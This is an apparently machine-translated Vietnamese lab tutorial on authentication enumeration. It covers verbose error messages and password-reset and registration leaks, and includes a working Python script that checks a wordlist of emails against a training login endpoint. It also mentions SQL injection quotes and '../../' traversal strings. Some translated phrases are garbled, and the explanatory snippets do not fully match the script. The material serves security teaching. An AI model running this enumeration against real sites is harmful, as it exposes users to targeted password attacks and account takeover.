Liệt kê xác thực

Hãy coi mình như một thám tử kỹ thuật số. Việc này không chỉ đơn thuần là thu thập manh mối, mà còn là hiểu được những manh mối đó tiết lộ điều gì về tính bảo mật của hệ thống. Về cơ bản, đó chính là những gì mà việc liệt kê xác thực bao gồm. Nó giống như việc ghép các mảnh ghép của một bức tranh hơn là chỉ đơn thuần đánh dấu vào các mục trong danh sách kiểm tra.

Việc liệt kê xác thực giống như việc bóc từng lớp vỏ hành tây. Bạn loại bỏ từng lớp bảo mật của hệ thống để khám phá các hoạt động thực sự bên dưới. Nó không chỉ đơn thuần là những kiểm tra thông thường; mà là để xem mọi thứ được kết nối với nhau như thế nào. 

Xác định tên người dùng hợp lệ

Việc biết được tên người dùng hợp lệ cho phép kẻ tấn công chỉ tập trung vào mật khẩu. Bạn có thể tìm ra tên người dùng bằng nhiều cách khác nhau, chẳng hạn như quan sát cách ứng dụng phản hồi trong quá trình đăng nhập hoặc đặt lại mật khẩu. Ví dụ, các thông báo lỗi chỉ rõ "tài khoản này không tồn tại" hoặc "mật khẩu không chính xác" có thể gợi ý về tên người dùng hợp lệ, giúp công việc của kẻ tấn công dễ dàng hơn. 

Chính sách mật khẩu

Các hướng dẫn khi tạo mật khẩu có thể cung cấp những hiểu biết giá trị về độ phức tạp của mật khẩu được sử dụng trong một ứng dụng. Bằng cách hiểu các chính sách này, kẻ tấn công có thể đánh giá độ phức tạp tiềm tàng của mật khẩu và điều chỉnh chiến lược của mình cho phù hợp. Ví dụ, như bên dưới
Đoạn mã PHP này sử dụng biểu thức chính quy (regex) để yêu cầu mật khẩu phải bao gồm các ký hiệu, số và chữ cái viết hoa: 

```
<?php
$password = $_POST['pass']; // Example1
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
?>
```
Trong ví dụ trên, nếu mật khẩu được cung cấp không đáp ứng chính sách được định nghĩa trong biến mẫu , ứng dụng sẽ trả về thông báo lỗi tiết lộ yêu cầu về mã biểu thức chính quy. Kẻ tấn công có thể tạo ra một từ điển đáp ứng chính sách này. 

Những địa điểm thường dùng để liệt kê

Các ứng dụng web có rất nhiều tính năng giúp người dùng dễ dàng hơn nhưng cũng có thể khiến họ gặp rủi ro:

Trang đăng ký

Các ứng dụng web thường làm cho quá trình đăng ký người dùng trở nên đơn giản và dễ hiểu bằng cách ngay lập tức cho biết liệu email hoặc tên người dùng có khả dụng hay không. Mặc dù phản hồi này được thiết kế để nâng cao trải nghiệm người dùng, nhưng nó có thể vô tình phục vụ mục đích kép. Nếu một lần đăng ký dẫn đến thông báo cho biết tên người dùng hoặc email đã được sử dụng, ứng dụng đang vô tình xác nhận sự tồn tại của nó cho bất kỳ ai đang cố gắng đăng ký. Kẻ tấn công khai thác tính năng này bằng cách thử nghiệm các tên người dùng hoặc email tiềm năng, từ đó lập danh sách người dùng đang hoạt động mà không cần truy cập trực tiếp vào cơ sở dữ liệu.

Tính năng đặt lại mật khẩu

Cơ chế đặt lại mật khẩu được thiết kế để giúp người dùng lấy lại quyền truy cập vào tài khoản của họ bằng cách nhập thông tin chi tiết để nhận hướng dẫn đặt lại. Tuy nhiên, sự khác biệt trong phản hồi của ứng dụng có thể vô tình tiết lộ thông tin nhạy cảm. Ví dụ, sự khác biệt trong phản hồi của ứng dụng về việc tên người dùng có tồn tại hay không có thể giúp kẻ tấn công xác minh danh tính người dùng. Bằng cách phân tích các phản hồi này, kẻ tấn công có thể tinh chỉnh danh sách tên người dùng hợp lệ của chúng, cải thiện đáng kể hiệu quả của các cuộc tấn công tiếp theo.

Lỗi dài dòng

Các thông báo lỗi dài dòng trong quá trình đăng nhập hoặc các quy trình tương tác khác có thể tiết lộ quá nhiều thông tin. Khi các thông báo này phân biệt giữa "không tìm thấy tên người dùng" và "mật khẩu không chính xác", mục đích là để giúp người dùng hiểu rõ vấn đề đăng nhập của họ. Tuy nhiên, chúng cũng cung cấp cho kẻ tấn công những manh mối rõ ràng về tên người dùng hợp lệ, điều này có thể bị lợi dụng để thực hiện các cuộc tấn công có mục tiêu hơn.

Thông tin về vi phạm dữ liệu

Dữ liệu từ các vụ vi phạm an ninh trước đây là một kho báu đối với tin tặc vì nó cho phép chúng kiểm tra xem tên người dùng và mật khẩu bị xâm phạm có được sử dụng lại trên các nền tảng khác nhau hay không. Nếu kẻ tấn công tìm thấy sự trùng khớp, điều đó không chỉ cho thấy tên người dùng được sử dụng lại mà còn cả khả năng tái sử dụng mật khẩu, đặc biệt nếu nền tảng đó đã từng bị xâm phạm trước đây. Kỹ thuật này cho thấy tác động của một vụ vi phạm dữ liệu duy nhất có thể lan rộng qua nhiều nền tảng, khai thác các mối liên hệ giữa các danh tính trực tuyến khác nhau. 

Hiểu về các lỗi diễn đạt dài dòng

Hãy tưởng tượng bạn là một thám tử có khả năng phát hiện ra những manh mối mà người khác có thể bỏ qua. Trong thế giới phát triển web, các lỗi chi tiết giống như những lời thì thầm vô tình của hệ thống, tiết lộ những bí mật vốn dĩ cần được giữ kín. Những thông báo lỗi chi tiết này vô cùng quý giá trong quá trình gỡ lỗi, giúp các nhà phát triển hiểu chính xác điều gì đã xảy ra. Tuy nhiên, cũng giống như một cuộc trò chuyện tình cờ có thể tiết lộ quá nhiều, những lỗi chi tiết này có thể vô tình làm lộ dữ liệu nhạy cảm cho những người biết cách lắng nghe. 

Những lỗi diễn đạt dài dòng có thể trở thành kho tàng thông tin quý giá, cung cấp những hiểu biết như:

    Đường dẫn nội bộ : Giống như một tấm bản đồ dẫn đến kho báu ẩn giấu, chúng tiết lộ đường dẫn tệp và cấu trúc thư mục của máy chủ ứng dụng, có thể chứa các tệp cấu hình hoặc khóa bí mật mà người dùng thông thường không thể nhìn thấy.
    Chi tiết cơ sở dữ liệu : Cung cấp cái nhìn thoáng qua về cơ sở dữ liệu, những lỗi này có thể tiết lộ các thông tin bí mật như tên bảng và chi tiết cột.
    Thông tin người dùng : Đôi khi, những lỗi này thậm chí có thể hé lộ tên người dùng hoặc dữ liệu cá nhân khác, cung cấp những manh mối quan trọng cho việc điều tra tiếp theo.

Gây ra lỗi diễn đạt dài dòng
Kẻ tấn công cố tình tạo ra các lỗi dài dòng nhằm buộc ứng dụng phải tiết lộ thông tin bí mật. Dưới đây là một số kỹ thuật phổ biến được sử dụng để gây ra các lỗi này:

Các lần đăng nhập không hợp lệ : Điều này giống như việc gõ cửa từng nhà để xem nhà nào sẽ mở. Bằng cách cố ý nhập tên người dùng hoặc mật khẩu không chính xác, kẻ tấn công có thể kích hoạt các thông báo lỗi giúp phân biệt giữa tên người dùng hợp lệ và không hợp lệ. Ví dụ, việc nhập tên người dùng không tồn tại có thể kích hoạt một thông báo lỗi khác so với việc nhập tên người dùng có tồn tại, từ đó tiết lộ tên người dùng nào đang hoạt động.

SQLTiêm : Kỹ thuật này bao gồm việc đưa chất độc vào cơ thể.SQLNhập các lệnh vào các trường nhập liệu, với hy vọng hệ thống sẽ gặp lỗi và tiết lộ thông tin về cấu trúc cơ sở dữ liệu của nó. Ví dụ, việc đặt dấu ngoặc đơn (" ') vào trường đăng nhập có thể khiến cơ sở dữ liệu báo lỗi, vô tình làm lộ chi tiết về lược đồ của nó.

Tấn công chèn tệp/truy cập đường dẫn : Bằng cách thao túng đường dẫn tệp, kẻ tấn công có thể cố gắng truy cập các tệp bị hạn chế, khiến hệ thống gặp lỗi và làm lộ các đường dẫn nội bộ. Ví dụ, sử dụng các chuỗi tấn công truy cập thư mục như `../../` có thể dẫn đến lỗi làm lộ các đường dẫn tệp bị hạn chế.

Thao tác biểu mẫu : Việc điều chỉnh các trường hoặc tham số trong biểu mẫu có thể đánh lừa ứng dụng hiển thị các lỗi làm lộ logic phía máy chủ hoặc thông tin nhạy cảm của người dùng. Ví dụ, việc lọc các trường ẩn trong biểu mẫu để kích hoạt lỗi xác thực có thể tiết lộ thông tin chi tiết về định dạng hoặc cấu trúc dữ liệu dự kiến.

Kiểm thử lỗi ứng dụng (Application Fuzzing ): Việc gửi các tín hiệu đầu vào bất ngờ đến nhiều phần khác nhau của ứng dụng để xem phản ứng của nó có thể giúp xác định các điểm yếu. Ví dụ, các công cụ như Burp Suite Intruder được sử dụng để tự động hóa quá trình này, tấn công ứng dụng bằng nhiều loại dữ liệu khác nhau để xem dữ liệu nào gây ra lỗi có thông tin.

Vai trò của liệt kê và phương pháp vét cạn

Khi nói đến việc phá vỡ xác thực, việc liệt kê thông tin và tấn công vét cạn thường đi đôi với nhau:

Liệt kê người dùng : Việc phát hiện các tên người dùng hợp lệ sẽ tạo tiền đề, giảm thiểu phỏng đoán trong các cuộc tấn công vét cạn tiếp theo.
Khai thác các lỗi chi tiết : Những hiểu biết thu được từ các lỗi này có thể làm sáng tỏ các khía cạnh như chính sách mật khẩu và cơ chế khóa tài khoản, mở đường cho các chiến lược tấn công vét cạn hiệu quả hơn.

Liệt kê trong các biểu mẫu xác thực

Trong báo cáo của HackerOne này(mở trong tab mới)Kẻ tấn công đã có thể liệt kê thông tin người dùng bằng chức năng "Quên mật khẩu" của trang web. Tương tự, chúng ta cũng có thể liệt kê địa chỉ email trong các biểu mẫu đăng nhập. Ví dụ, hãy truy cập  `http://enum.thm/labs/verbose_login/` (mở trong tab mới) và nhập bất kỳ địa chỉ email nào vào ô nhập Email.

Khi bạn nhập email không hợp lệ, trang web sẽ hiển thị thông báo "Email không tồn tại", cho biết email đó chưa được đăng ký.

<img width="2970" height="636" alt="image" src="https://github.com/user-attachments/assets/ced42f2f-0d4b-4705-b3f4-bca3b30e745d" />

Tuy nhiên, nếu email đã được đăng ký, trang web sẽ hiển thị thông báo lỗi "Mật khẩu không hợp lệ", cho thấy email đó đã tồn tại trong cơ sở dữ liệu nhưng mật khẩu không chính xác.

<img width="2984" height="634" alt="image" src="https://github.com/user-attachments/assets/2795e73d-f721-49e0-90ff-5a0c3892af74" />

Tự động hóa

Dưới đây là một đoạn mã Python sẽ kiểm tra các địa chỉ email hợp lệ trong ứng dụng web mục tiêu. Hãy lưu đoạn mã này dưới dạng tập tin script.py .

```
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

Chúng ta có thể sử dụng danh sách email chung từ kho lưu trữ này.(`https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt`).

Hàng nhập khẩu :

requests : Một thư viện Python để tạoHTTPYêu cầu. Chức năng này được sử dụng để tương tác với máy chủ web bằng cách gửi các yêu cầu POST đến điểm cuối mục tiêu.

`import requests`

Cài đặt :

URL : Đoạn mã này nhắm đến điểm cuối xử lý chức năng đăng nhập của ứng dụng.

`url = 'http://enum.thm/labs/verbose_login/functions.php'`

tiêu đề : Một tập hợp cácHTTPCác tiêu đề được định nghĩa để mô phỏng một yêu cầu trình duyệt thông thường, đảm bảo các yêu cầu đó có vẻ hợp lệ.
```
headers = {
      'Host': 'enum.thm',
      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'Origin': 'http://enum.thm',
      'Connection': 'close',
      'Referer': 'http://enum.thm/labs/verbose_login/',
  }
```

Khởi tạo biến :

valid_emails : Một mảng lưu trữ các địa chỉ email đã được xác nhận là hợp lệ.

`valid_emails = []`

invalid_error : Một chuỗi chứa thông báo lỗi cụ thể được sử dụng để xác định các email không hợp lệ.

`invalid_error = 'Email does not exist'`

Vòng lặp chính :

Đoạn mã này đọc địa chỉ email từ một tệp được cung cấp và kiểm tra tính hợp lệ của từng địa chỉ bằng cách sử dụng `check_email` hàm.
```
for email in email_list:
    check_email(email)
```
Soạn thảo và gửi yêu cầu HTTP :

Với mỗi email, đoạn mã sẽ tạo ra một từ điển dữ liệu bao gồm địa chỉ email, mật khẩu tạm thời và lệnh để thực thi chức năng 'đăng nhập'.
```
data = {'username': email, 'password': 'password', 'action': 'login'}
response = requests.post(url, headers=headers, data=data)
```
Xử lý phản hồi :

Phản hồi từ máy chủ được xử lý để kiểm tra xem email được cung cấp có tồn tại hay không, dựa trên sự hiện diện của thông báo lỗi cụ thể trong dữ liệu JSON.
```
if invalid_error in response.text:
    print(f"{email} is invalid.")
else:
    print(f"{email} is valid.")
    valid_emails.append(email)
```
Xác minh danh tính :

Các email được xác nhận là có thật sẽ được thêm vào valid_emailsdanh sách, và trạng thái hợp lệ của mỗi email sẽ được ghi lại vào bảng điều khiển.
```
for email in valid_emails:
    print(f"Valid email found: {email}")
```
Sau khi tải xuống danh sách payload, hãy sử dụng tập lệnh trên AttackBox hoặc máy tính của bạn để kiểm tra các địa chỉ email hợp lệ.


